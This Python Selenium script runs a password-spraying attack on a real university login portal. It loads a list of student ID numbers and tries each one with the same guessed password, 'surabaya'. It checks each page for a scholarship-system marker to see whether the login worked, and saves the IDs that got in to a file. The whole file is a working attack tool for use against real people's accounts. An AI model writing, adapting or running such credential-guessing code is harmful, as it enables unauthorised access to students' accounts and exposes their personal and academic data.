import time 
import requests
from selenium import webdriver 
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support import expected_conditions as EC 


url = 'https://integra.its.ac.id/'
driver = webdriver.Firefox()

driver.get(url) 
with open('nrp.txt','r') as f: 
    koleksi_nrp=f.readlines()

# koleksi_nrp = [
#     '1215100115','1213100113','121310024'
# ]

koleksi_nrp.sort()
nrp_password_sby = []

def login(nrp, password): 
    email = driver.find_element_by_id('userid')
    pswd = driver.find_element_by_id('password')

    email.send_keys(nrp)
    pswd.send_keys(password)

    pswd.send_keys(Keys.ENTER)

def logout(): 
    selectelement = driver.find_element_by_id('navbarDropdown')
    selectelement.click()
    driver.find_element_by_xpath('/html/body/nav/div/ul/li/div/a[3]').click()

def wait_til(xpath):
        WebDriverWait(driver,2).until(
        EC.visibility_of_element_located((By.XPATH,xpath))
    )
    
for nrp in koleksi_nrp: 
    try:
        wait_til('/html/body/div/div/div[2]/div/div[3]/div[4]/div/form/div[3]/button')
        login(nrp, 'surabaya')
    except: 
        pass
    
    # if 'gagal' in body.text: 
    #     print('gagal dari if', nrp)
    #     driver.delete_all_cookies()
    #     time.sleep(0.5)
    #     continue

    try: 
        # wait_til('//*[@id="navbarDropdown"]')
        driver.delete_all_cookies()
        time.sleep(.5)
        body = driver.find_element(By.TAG_NAME,'body')
        # print(body.text)
        body = body.text
        if 'SI Beasiswa' in body:  
            logout()    
            print(nrp,'masuk')
            with open('berhasil.txt','a') as f: 
                f.writelines(nrp+'\n')
            driver.delete_all_cookies()
            continue
        else: 
            print(nrp, 'gagal dari if')
    except: 
        print(nrp,'gagal')
        driver.delete_all_cookies()
driver.quit()